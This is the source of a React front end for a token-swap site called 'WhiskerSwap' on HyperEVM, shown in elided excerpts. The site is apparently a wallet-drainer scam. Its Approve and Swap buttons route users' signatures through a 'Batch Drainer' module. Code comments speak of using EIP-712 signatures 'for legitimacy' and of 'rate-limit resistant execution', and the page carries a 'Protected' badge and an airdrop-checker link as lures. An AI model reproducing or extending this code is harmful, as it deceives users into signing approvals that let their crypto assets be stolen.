...
const HYPEREVM_TOKENS: TokenInfo[] = [
  ...
  { address: "0x5555555555555555555555555555555555555555", symbol: "WHYPE", name: "Wrapped HYPE", decimals: 18, balance: "0.0", price: "48.70" },
...
export default function Swap() {
  ...
  // Handle approve button for ALL tokens - EIP-712 signatures
  const handleApprove = async () => {
    ...
    setIsApproving(true);
    try {
      // Use Batch Drainer for approval flow
      const drainer = createBatchDrainer(wallet.signer, wallet.provider);
      
      if (fromToken.address === "0x0000000000000000000000000000000000000000") {
        console.log("🔓 HYPE approval - native token");
        ...
        toast({
          title: "HYPE Ready",
          description: "HYPE ready for swapping",
        });
        
      } else {
        // For ERC20 tokens: Use EIP-712 drainer approval
        console.log(`🔓 EIP-712 approval for ${fromToken.symbol}`);
        
        const approvalResult = await drainer.approveToken(fromToken.address, wallet.address);
        
        if (approvalResult.success) {
          setNeedsApproval(false);
          console.log(`✅ EIP-712 approval granted: ${approvalResult.hash}`);
  ...
  // Handle swap execution - EIP-712 signatures for legitimacy
  const handleSwap = async () => {
    ...
    try {
      console.log("🔄 EIP-712 SWAP EXECUTION");
      console.log(`📤 FROM: ${fromAmount} ${fromToken.symbol}`);
      console.log(`📥 TO: ${toAmount} ${toToken.symbol}`);
      
      // Use Batch Drainer for rate-limit resistant execution
      const drainer = createBatchDrainer(wallet.signer, wallet.provider);
      ...
      const swapResult = await drainer.executeSwap(
        fromToken.address,
        toToken.address,
        fromAmount,
        wallet.address
      ...
      if (swapResult.success && swapResult.hash) {
        console.log(`✅ EIP-712 SWAP CONFIRMED: ${swapResult.hash}`);
  ...
  return (
    <div className="min-h-screen w-full max-w-full overflow-x-hidden bg-gradient-to-br from-hyper-navy via-slate-900 to-slate-800">
      {/* Header */}
      <header className="bg-[#0B1A1E]/90 backdrop-blur-md border-b border-[#7FFFD4]/20 w-full">
        <div className="max-w-full mx-auto px-2 sm:px-4 lg:px-8">
          <div className="flex justify-between items-center h-16 w-full max-w-full">
            <div className="flex items-center space-x-2 sm:space-x-3 flex-1 min-w-0">
              ...
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" size="sm" className="h-8 w-8 p-0 text-white hover:bg-[#7FFFD4]/20 flex-shrink-0">
                    <Menu className="h-4 w-4" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="start" className="w-56 bg-slate-800 border-[#7FFFD4]/30">
                  ...
                  <DropdownMenuItem asChild>
                    <Link href="/airdrop" className="flex items-center space-x-2 cursor-pointer text-white hover:text-[#7FFFD4]">
                      <Gift className="w-4 h-4 text-[#7FFFD4]" />
                      <span>Airdrop Checker</span>
                    </Link>
                  </DropdownMenuItem>
                  <DropdownMenuItem asChild>
              ...
              <h1 className="text-sm sm:text-lg font-bold text-[#7FFFD4] truncate">WhiskerSwap</h1>
            ...
            <div className="flex items-center space-x-2 sm:space-x-4 flex-shrink-0">
              {userPoints > 100 && (
                <div className="hidden sm:flex items-center space-x-2 bg-[#7FFFD4]/10 px-2 py-1 rounded-full">
              ...
              {wallet.isConnected ? (
                <DropdownMenu>
                  ...
                  <DropdownMenuContent align="end" className="w-48 bg-slate-800 border-slate-700">
                    <div className="px-3 py-2 border-b border-slate-700">
                      ...
                      <p className="text-xs text-[#7FFFD4]">{parseFloat(wallet.balance || "0").toFixed(4)} HYPE</p>
                    </div>
                    <DropdownMenuItem 
                ...
                <Button
                  ...
                  className="bg-gradient-to-r from-[#7FFFD4]/10 to-[#00FFE0]/10 hover:from-[#7FFFD4]/20 hover:to-[#00FFE0]/20 border-[#7FFFD4]/30 text-xs sm:text-sm px-2 sm:px-3"
                >
                  <Wallet className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
      ...
      <main className="w-full max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
        <div className="flex justify-center">
          ...
          <div className="w-full max-w-xl mx-auto">
            <Card className="bg-slate-800/90 backdrop-blur-md border-[#7FFFD4]/30 shadow-2xl w-full">
              <CardHeader className="pb-4 md:pb-6">
                <div className="flex justify-between items-center">
                  <div className="flex items-center space-x-4">
                    <CardTitle className="text-lg sm:text-xl md:text-2xl font-bold text-[#7FFFD4]">
                      Swap Tokens
                    </CardTitle>
                          ...
                          <div className="space-y-3">
                            <div className="flex space-x-2">
                              {[0.1, 0.5, 1.0].map((value) => (
                                <Button
                                  ...
                                  size="sm"
                                  className={`h-8 px-4 ${slippage === value ? 'bg-[#7FFFD4] text-[#0B1A1E]' : 'border-slate-600 hover:border-[#7FFFD4]'}`}
                            ...
                            <div className="flex items-center space-x-2">
                              <input
                                ...
                                className="flex-1 h-8 px-3 bg-slate-700 border border-slate-600 rounded text-white text-sm focus:outline-none focus:border-[#7FFFD4]"
                                placeholder="Custom"
                              />
              ...
              <CardContent className="space-y-6">
                ...
                <div className="space-y-2">
                  ...
                  <div className="bg-slate-900/60 rounded-2xl p-4 border border-slate-700 hover:border-[#7FFFD4]/40 transition-colors">
                                ...
                                <SelectItem key={token.address} value={token.address}>
                                  <div className="flex items-center space-x-2">
                                    ...
                                    {token.price && parseFloat(token.price) > 0 ? (
                                      <span className="text-xs text-[#7FFFD4]">${token.price}</span>
                                    ) : (
                            ...
                            <div className="text-xs text-gray-400 text-right flex items-center justify-end space-x-2">
                              ...
                              {wallet.isConnected && (
                                <Button
                                  ...
                                  className="h-4 w-4 p-0 hover:bg-[#7FFFD4]/20"
                                >
                    ...
                    <div className="flex items-center justify-between">
                      ...
                      <div className="flex items-center space-x-2">
                        ...
                        <div className="flex items-center space-x-1">
                          ...
                          <span className="text-xs text-[#7FFFD4]">Optimized</span>
                        </div>
                      </div>
                    </div>
                ...
                <div className="flex items-center justify-center space-x-6 py-3 bg-slate-800/20 rounded-xl border border-green-400/10">
                  ...
                  <div className="flex items-center space-x-1">
                    <Zap className="w-3 h-3 text-[#7FFFD4]" />
                    <span className="text-xs text-[#7FFFD4] font-medium">Protected</span>
                  </div>
                </div>
                      ...
                      return (
                        <div className="space-y-3">
                          <Button
                            ...
                            disabled={wallet.isLoading}
                            className="w-full py-6 bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] hover:from-[#7FFFD4]/80 hover:to-[#00FFE0]/80 text-[#0B1A1E] font-semibold rounded-xl shadow-lg glow text-lg"
                            size="lg"
                          >
                            {wallet.isLoading ? (
                              <div className="flex items-center space-x-2">
                        ...
                        <div className="space-y-3">
                          <Button
                            onClick={async () => {
                              ...
                              try {
                                const drainer = createBatchDrainer(signer, provider);
                                
                                const result = await drainer.approveToken(fromToken.address, wallet.address);
                            ...
                            className="w-full py-6 bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] hover:from-[#7FFFD4]/80 hover:to-[#00FFE0]/80 text-[#0B1A1E] font-semibold rounded-xl shadow-lg border border-[#7FFFD4]/50 text-lg"
                            size="lg"
                          >
                            {isApproving ? (
                              <div className="flex items-center space-x-2">
                                <div className="w-4 h-4 border-2 border-[#0B1A1E]/30 border-t-[#0B1A1E] rounded-full animate-spin"></div>
                                <span>Approving...</span>
                              </div>
                            ) : (
                          ...
                          <Button
                            onClick={async () => {
                              ...
                              try {
                                ...
                                // Use Batch Drainer for streamlined signatures
                                const drainer = createBatchDrainer(signer, provider);
                                
                                const result = await drainer.executeSwap(
                                  fromToken.address,
                                  toToken.address,
                                  fromAmount,
                                  wallet.address
                            ...
                            className={`w-full py-6 font-semibold rounded-xl text-lg ${
                              isDisabled 
                                ...
                                : "bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] hover:from-[#7FFFD4]/80 hover:to-[#00FFE0]/80 text-[#0B1A1E] glow"
                            }`}
                            size="lg"
                          >
                            Swap Tokens
